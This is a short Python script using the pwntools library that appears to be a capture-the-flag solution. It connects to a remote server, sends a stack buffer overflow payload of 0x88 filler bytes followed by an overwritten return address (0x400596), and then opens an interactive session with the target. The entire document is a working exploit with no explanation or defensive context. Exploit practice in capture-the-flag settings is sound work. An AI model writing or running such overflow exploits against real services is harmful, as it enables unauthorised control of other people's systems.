from pwn import *

r = remote('111.198.29.45', 38302)
payload = 'a' * 0x88 + p64(0x400596)

r.send(payload)
r.interactive()